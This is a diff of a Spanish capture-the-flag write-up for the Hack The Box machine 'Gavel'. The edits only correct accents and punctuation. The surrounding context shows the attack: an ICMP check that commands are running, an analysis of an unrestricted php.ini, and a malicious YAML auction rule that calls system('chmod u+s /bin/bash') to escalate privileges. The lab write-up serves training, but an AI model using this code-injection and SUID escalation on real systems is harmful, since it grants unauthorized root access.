@@ -737,11 +737,11 @@ Para que se haga efectiva la ejecución, tenemos que hacer una puja del producto
 <img src="/assets/images/htb-writeup-gavel/Captura14.png">
 </p>
 
-No vemos un resultado como tal, pero parece que si se esta ejecutando algo.
+No vemos un resultado como tal, pero parece que sí se está ejecutando algo.
 
-Notaras que la página se estara recargando cada segundo que pasa, por lo que hay una gran probabilidad de que nuestro comando se este ejecutando cada segundo.
+Notarás que la página se estará recargando cada segundo que pasa, por lo que hay una gran probabilidad de que nuestro comando se esté ejecutando cada segundo.
 
-Para probar rapidamente si es que encontramos una forma de ejecutar comandos, podemos mandarnos una **traza ICMP** a nuestra máquina.
+Para probar rápidamente si es que encontramos una forma de ejecutar comandos, podemos mandarnos una **traza ICMP** a nuestra máquina.
 
 Primero, levantemos un listener con **tcpdump** para que capture esa **traza ICMP**:
 ```bash
@@ -899,7 +899,7 @@ drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
 -rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
 drwxr-x--- 2 root root  4096 Dec  6 04:00 submission
 ```
-Hay algunos archivos, entre ellos vemos un **archivo YAML**.
+Hay algunos archivos; entre ellos vemos un **archivo YAML**.
 
 Leamos el contenido del **archivo YAML**:
 ```bash
@@ -913,7 +913,7 @@ item:
   rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
   rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
 ```
-Este archivo solo sirve de ejemplo de como funciona el sistema de subastas de la página web.
+Este archivo solo sirve de ejemplo de cómo funciona el sistema de subastas de la página web.
 
 Revisando el contenido del directorio `.config`, encontraremos un archivo **php.ini**:
 ```bash
@@ -1014,7 +1014,7 @@ Ya tenemos un archivo **php.ini** sin ninguna seguridad ni restricción:
 * `open_basedir=` -> Directiva de **PHP** que limita la lectura/escritura de archivos a ciertos directorios permitidos, pero al estar vacio significa que no hay restricción de acceso a archivos.
 * `disable_functions=` -> Directiva para bloquear funciones peligrosas como `exec,system,shell_exec,passthru,proc_open`, pero al estar vacia podemos usar estas funciones, lo que nos permite ejecutar cualquier código.
 
-Con esto listo, crearemos otro **archivo YAML** malicioso que inyecte un comando que le **permisos SUID** a la **Bash**:
+Con esto listo, crearemos otro **archivo YAML** malicioso que inyecte un comando que le dé **permisos SUID** a la **Bash**:
 ```bash
 name: privesc
 description: privesc on gavel
@@ -1024,7 +1024,7 @@ rule_msg: "privesc"
 rule: system('chmod u+s /bin/bash'); return false;
 ```
 
-Comprobémos los permisos de la **Bash**:
+Comprobemos los permisos de la **Bash**:
 ```bash
 auctioneer@gavel:/tmp/privesc$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
